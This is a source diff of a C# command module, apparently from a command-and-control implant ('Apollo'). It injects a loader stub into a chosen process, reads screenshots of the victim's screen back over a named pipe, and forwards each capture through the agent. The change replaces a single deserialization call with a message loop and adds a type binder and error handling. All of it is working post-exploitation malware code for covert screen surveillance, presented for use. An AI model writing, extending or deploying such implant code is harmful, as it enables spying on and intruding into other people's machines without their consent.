@@ -38,18 +38,15 @@ namespace Apollo.CommandModules
         /// <param name="implant">Agent associated with this task.</param>
         public static void Execute(Job job, Agent agent)
         {
-           
+            Task task = job.Task;
+            JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);
+
             string loaderStubID;
             byte[] loaderStub;
             string pipeName;
             int pid = -1;
 
-            List<byte[]> screenShots = null;
-
-            
-              
-            Task task = job.Task; 
-            JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);
+            List<ScreenshotMessage> receivedScreenshotMessages = new List<ScreenshotMessage>();
 
             ////
             // Parameter Checks
@@ -89,12 +86,12 @@ namespace Apollo.CommandModules
                 job.SetError($"Failed to get process with pid {pid}. Reason: {ex.Message}");
                 return;
             }
-
+              
 
             ////
             //  Execution
             ////
-
+            
             try
             {
 
@@ -108,26 +105,53 @@ namespace Apollo.CommandModules
                     NamedPipeClientStream pipeClient = new NamedPipeClientStream(pipeName);
                     pipeClient.Connect(30000);
 
-                    BinaryFormatter bf = new BinaryFormatter();
-
-                    try
+                    // Number of screenshots to be received is unknown. Keep processing screenshot messages until a termination message is received by the server.
+                    bool terminationReceived = false;
+                    while (!terminationReceived)
                     {
-                        screenShots = (List<byte[]>)bf.Deserialize(pipeClient);
-                        // Console.WriteLine($"Done! Received {screenShots.Count} Screenshots!");
-                        pipeClient.Close();
+
+                        try
+                        {
+                            var screenShotMessage = ReadScreenshotMessage(pipeClient);
+
+                            // Handle messages that contain screenshot information
+                            if (screenShotMessage.GetType() == typeof(ScreenshotMessage))
+                            {
+                                Console.WriteLine($"Received Screenshot!");
+                                receivedScreenshotMessages.Add((ScreenshotMessage)screenShotMessage);
+                            }
+
+                            else if (screenShotMessage.GetType() == typeof(ScreenshotTerminationMessage))
+                            {
+                                Console.WriteLine("Received Termination");
+                                terminationReceived = true;
+                                pipeClient.Close();
+                            }
+
+                            else
+                            {
+                                string error = "Received unexpected object type from Screenshot.ReadScreenshotMessage()";
+                                Console.WriteLine(error);
+                                job.SetError(error);
+                                pipeClient.Close();
+                                return;
+                            }
+
+                        }
+
+                        catch (Exception e)
+                        {
+                            pipeClient.Close();
+                            string error = $"Error deserializing screenshots received over pipe: {e.ToString()}";
+                            Console.WriteLine(error);
+                            job.SetError(error);
+                            return;
+                        }
                     }
 
-                    catch
-                    {
-                        // Console.WriteLine("Error receiving screenshots from pipe.");
-                        pipeClient.Close();
-                        job.SetError("Error deserializing screenshots received over pipe");
-                        return;
-                    }
 
 
-
-                    if (screenShots == null || screenShots.Count == 0)
+                    if (receivedScreenshotMessages == null || receivedScreenshotMessages.Count == 0)
                     {
                         job.SetError("Task executed successfully, but 0 Screenshots Were Returned");
                         return;
@@ -135,9 +159,15 @@ namespace Apollo.CommandModules
 
                     try
                     {
-                        foreach (byte[] screenShot in screenShots)
+                        foreach (ScreenshotMessage screenShotMsg in receivedScreenshotMessages)
                         {
-                            SendCapture(agent, job, screenShot);
+                            if (screenShotMsg.ErrorMessage != null)
+                            {
+                                job.SetError(screenShotMsg.ErrorMessage);
+                                return;
+                            }
+
+                            SendCapture(agent, job, screenShotMsg.Capture);
                         }
                     }
 
@@ -156,6 +186,14 @@ namespace Apollo.CommandModules
             {
                 job.SetError("Failed to inject into process");
             }
+        }
+
+        private static object ReadScreenshotMessage(NamedPipeClientStream pipeClient)
+        {
+            BinaryFormatter bf = new BinaryFormatter();
+            bf.Binder = new ScreenshotMessageBinder();
+            object message = bf.Deserialize(pipeClient);
+            return message;
         }
 
         /// <summary>
